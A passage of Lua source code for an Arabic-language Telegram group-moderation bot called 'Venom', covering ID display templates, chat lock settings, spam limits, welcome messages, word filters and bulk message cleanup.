newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "𖠧︙معرفك ↫ ❨ "..username.." ❩\n𖠧︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n𖠧︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n𖠧︙رسائلك ↫ ❨ "..user_msgs.." ❩\n𖠧︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n𖠧︙تفاعلك ↫ "..formsgs(msguser).."\n𖠧︙نقاطك ↫ ❨ "..user_nkt.." ❩"
end 
if not DevAbs:get(Venom.."Abs:GpIds:Text"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevAbs:get(Venom.."Abs:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevAbs:get(Venom.."Abs:AllIds:Text") then
notpicid = DevAbs:get(Venom.."Abs:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "𖠧︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙معرفك ↫ ❨ "..username.." ❩\n𖠧︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n𖠧︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n𖠧︙رسائلك ↫ ❨ "..user_msgs.." ❩\n𖠧︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n𖠧︙تفاعلك ↫ "..formsgs(msguser).."\n𖠧︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbs:get(Venom..'Abs:Lock:Id'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Lock:Id:Photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙معرفك ↫ ❨ "..username.." ❩\n𖠧︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n𖠧︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n𖠧︙رسائلك ↫ ❨ "..user_msgs.." ❩\n𖠧︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n𖠧︙رسائلك ↫ ❨ "..user_msgs.." ❩\n𖠧︙تفاعلك ↫ "..formsgs(msguser).."\n𖠧︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, VenomTEAM)
end
end 
--     Source Venom     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "التعديل" then
if not DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التعديل")  
DevAbs:set(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
if not DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل تعديل الميديا")  
DevAbs:set(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevAbs:get(Venom..'Abs:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الفارسيه")  
DevAbs:set(Venom..'Abs:Lock:Farsi'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevAbs:get(Venom..'Abs:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الفشار")  
DevAbs:del(Venom..'Abs:Lock:Fshar'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الطائفيه" then
if DevAbs:get(Venom..'Abs:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الطائفيه")  
DevAbs:del(Venom..'Abs:Lock:Taf'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevAbs:get(Venom..'Abs:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الكفر")  
DevAbs:del(Venom..'Abs:Lock:Kfr'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevAbs:get(Venom..'Abs:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل الفارسيه بالطرد")  
DevAbs:set(Venom..'Abs:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل البوتات بالحذف")  
DevAbs:set(Venom.."Abs:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل البوتات بالطرد")  
DevAbs:set(Venom.."Abs:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل البوتات بالتقيد")  
DevAbs:set(Venom.."Abs:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التكرار بالطرد")  
end
if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevAbs:get(Venom..'Abs:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevAbs:set(Venom.."Abs:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم قفل التثبيت")  
DevAbs:set(Venom..'Abs:Lock:Pin'..msg.chat_id_,true)
DevAbs:sadd(Venom.."Abs:Lock:Pinpin",msg.chat_id_) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source Venom     --
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevAbs:hset(Venom.."Abs:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
--     Source Venom     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Id:Photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevAbs:get(Venom..'Abs:Lock:Id:Photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Id'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الايدي بالتاكيد مفعل ', 1, 'md')
else
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevAbs:get(Venom..'Abs:Lock:Id'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الايدي بالتاكيد معطل ', 1, 'md')
else
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Venom     --
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevAbs:setex(Venom.."Abs:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' or text == 'انشاء الرابط' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevAbs:get(Venom.."Abs:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevAbs:set(Venom.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevAbs:setex(Venom.."Abs:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
--     Source Venom     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom.."Abs:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom.."Abs:Lock:Welcome"..msg.chat_id_)
end
if DevAbs:get(Venom..'Abs:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevAbs:del(Venom..'Abs:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(Venom..'Abs:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevAbs:set(Venom..'Abs:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل لي الترحيب الان\n𖠧︙تستطيع اضافة مايلي ↫ ⤈\n𖠧︙دالة عرض الاسم ↫ firstname\n𖠧︙دالة عرض المعرف ↫ username', 1, 'md')
DevAbs:set(Venom..'Abs:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف الترحيب")  
DevAbs:del(Venom..'Abs:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevAbs:get(Venom..'Abs:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Abs(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لم يتم وضع الترحيب \n𖠧︙ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     Source Venom     --
if DevAbs:get(Venom..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء حفظ الوصف", 1, 'md')
DevAbs:del(Venom..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(Venom..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevAbs:set(Venom..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل لي الوصف الان', 1, 'md')
end
--     Source Venom     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل لي الكلمه الان", 1, 'md') 
DevAbs:set(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevAbs:get(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر المنع', 1, 'md')
DevAbs:del(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم منع الكلمه ↫ "..text, 1, 'html')
DevAbs:del(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevAbs:hset(Venom..'Abs:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل لي الكلمه الان", 1, 'md') 
DevAbs:set(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevAbs:get(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر الغاء المنع', 1, 'md')
DevAbs:del(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevAbs:hget(Venom..'Abs:Filters:'..msg.chat_id_, text) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevAbs:del(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevAbs:hdel(Venom..'Abs:Filters:'..msg.chat_id_, text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevAbs:del(Venom.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source Venom     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫ الاحصائيات 𖠧" then
local gps = DevAbs:scard(Venom.."Abs:Groups") local users = DevAbs:scard(Venom.."Abs:Users") 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙احصائيات البوت ↫ ⤈\n𖠧︙عدد المشتركين ↫ ❨ '..users..' ❩\n𖠧︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين 𖠧" then
local users = DevAbs:scard(Venom.."Abs:Users")
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات 𖠧" then
local gps = DevAbs:scard(Venom.."Abs:Groups")
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
end
--     Source Venom     --
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not DevAbs:get(Venom..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevAbs:setex(Venom..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevAbs:smembers(Venom.."Abs:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevAbs:srem(Venom.."Abs:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عدد المشتركين الان ↫ { '..#pv..' }\n𖠧︙تم حذف ↫ { '..sendok..' } من المشتركين\n𖠧︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source Venom     --
if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevAbs:smembers(Venom.."Abs:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevAbs:srem(Venom.."Abs:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = Venom, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbs:srem(Venom.."Abs:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAbs:srem(Venom.."Abs:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevAbs:srem(Venom.."Abs:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local Venomgp2 = (w + q)
local Venomgp3 = #group - Venomgp2
if q == 0 then
Venomgp2 = ''
else
Venomgp2 = '\n𖠧︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
Venomgp1 = ''
else
Venomgp1 = '\n𖠧︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙عدد الكروبات الان ↫ { '..#group..' }'..Venomgp1..Venomgp2..'\n𖠧︙العدد الحقيقي الان  ↫ ( '..Venomgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source Venom     --
if text and (text == "تفعيل امسح" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل امسح مع ميزة الحذف التلقائي للميديا'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:Clean'..msg.chat_id_,true)  
end
if text and (text == "تعطيل امسح" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل امسح مع ميزة الحذف التلقائي للميديا'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:Clean'..msg.chat_id_) 
end
if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$")) and Constructor(msg) then   
local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$")
if tonumber(Num) < 50 or tonumber(Num) > 200 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بتحديد عدد اكبر من 50 واصغر من 200 للحذف التلقائي', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevAbs:set(Venom..'Abs:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevAbs:get(Venom..'Abs:Lock:Clean'..msg.chat_id_) then
if DevAbs:get(Venom..'Abs:CleanNum'..msg.chat_id_) then CleanNum = DevAbs:get(Venom..'Abs:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevAbs:scard(Venom.."Abs:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevAbs:smembers(Venom.."Abs:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"𖠧︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
DevAbs:del(Venom.."Abs:cleaner"..msg.chat_id_)
end 
end 
if Cleaner(msg) then
if DevAbs:get(Venom..'Abs:Lock:Clean'..msg.chat_id_) then 
